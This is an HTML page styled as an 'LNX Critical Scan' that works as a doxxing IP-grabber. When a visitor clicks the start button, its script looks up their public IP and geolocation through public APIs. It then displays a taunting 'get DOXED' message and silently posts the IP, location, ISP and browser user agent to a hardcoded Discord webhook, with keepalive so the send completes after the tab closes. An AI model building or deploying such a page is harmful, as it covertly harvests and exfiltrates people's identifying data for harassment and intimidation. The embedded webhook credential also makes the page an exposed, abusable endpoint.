<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>LNX | Critical Scan</title>
    <style>
        body { 
            background: #000 url('https://i.redd.it/jxrd0n9xcgxa1.png') no-repeat center fixed;
            background-size: cover; color: #ff0000; font-family: 'Consolas', monospace; 
            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh;
            overflow: hidden;
        }
        .flash-red { animation: bg-flash 0.3s infinite; }
        @keyframes bg-flash {
            0% { background-color: rgba(255, 0, 0, 0.7); }
            50% { background-color: rgba(0, 0, 0, 1); }
            100% { background-color: rgba(255, 0, 0, 0.7); }
        }
        .container {
            background: rgba(0, 0, 0, 0.98); border: 2px solid #ff0000;
            padding: 40px; width: 95%; max-width: 600px; box-shadow: 0 0 60px #ff0000; text-align: center;
        }
        #overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 100; display: flex; justify-content: center; align-items: center;
        }
        .btn-enter {
            border: 2px solid #ff0000; color: #ff0000; background: transparent;
            padding: 20px 50px; font-size: 2em; cursor: pointer; font-family: inherit;
        }
        h1 { font-size: 4em; text-shadow: 0 0 20px red; margin: 0; letter-spacing: 20px; }
        .teeth-img { width: 70%; margin: 20px 0; filter: drop-shadow(0 0 15px red); }
        .data-box { background: #050505; border: 1px solid #ff0000; padding: 15px; margin: 15px 0; text-align: left; }
        .data-line { font-size: 1em; margin: 10px 0; display: flex; justify-content: space-between; border-bottom: 1px solid #300; }
        .value { color: #fff; text-shadow: 0 0 5px #fff; }
        #dox-message { display: none; color: #fff; font-size: 2.5em; font-weight: 900; animation: shake 0.1s infinite; }
        @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -3px); } 100% { transform: translate(3px, -3px); } }
    </style>
</head>
<body>

<div id="overlay">
    <button class="btn-enter" onclick="startLNX()">INITIALIZE LNX</button>
</div>

<div id="visitor-ui" class="container">
    <h1>LNX</h1>
    <img src="https://i.imgur.com/r6I6UvC.png" class="teeth-img">
    <div class="data-box">
        <div class="data-line"><span>REAL IP:</span> <span class="value" id="ip">FETCHING...</span></div>
        <div class="data-line"><span>LOCATION:</span> <span class="value" id="loc">LOCATING...</span></div>
        <div class="data-line"><span>PROVIDER:</span> <span class="value" id="isp">IDENTIFYING...</span></div>
    </div>
    <div id="dox-message">HAHHAHAHA get DOXED :(</div>
</div>

<audio id="audio-player" loop>
    <source src="http://googleusercontent.com/file_content/23" type="audio/mpeg">
</audio>

<script>
    const HOOK = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";

    async function startLNX() {
        // 1. Remove Overlay & Play Audio
        document.getElementById('overlay').style.display = 'none';
        const audio = document.getElementById('audio-player');
        audio.play().catch(e => console.log("Audio block:", e));

        // 2. Fetch High-Accuracy IP
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const ipData = await response.json();
            const realIP = ipData.ip;
            document.getElementById('ip').innerText = realIP;

            // 3. Fetch Geo Data using the REAL IP
            const geoRes = await fetch(`https://ipapi.co/${realIP}/json/`);
            const geo = await geoRes.json();
            
            const fullLoc = `${geo.city}, ${geo.region}, ${geo.country_name} (${geo.postal})`;
            document.getElementById('loc').innerText = fullLoc;
            document.getElementById('isp').innerText = geo.org;

            // 4. Trigger Scare
            document.getElementById('dox-message').style.display = 'block';
            document.body.classList.add('flash-red');

            // 5. Send to Discord
            sendToDiscord(realIP, fullLoc, geo.org);

        } catch (err) {
            document.getElementById('ip').innerText = "ERROR Bypassing VPN";
        }
    }

    function sendToDiscord(ip, loc, isp) {
        const payload = {
            content: "@everyone **LNX CAPTURE SUCCESSFUL**",
            embeds: [{
                title: "💀 TARGET UNMASKED",
                color: 16711680,
                fields: [
                    { name: "REAL IP", value: ip },
                    { name: "FULL LOCATION", value: loc },
                    { name: "ISP", value: isp },
                    { name: "DEVICE", value: navigator.userAgent }
                ],
                footer: { text: "LNX v21 | HAHHAHAHA get DOXED :(" }
            }]
        };

        // Use 'keepalive' to ensure the request finishes even if the tab closes
        fetch(HOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
        });
    }
</script>
</body>
</html>
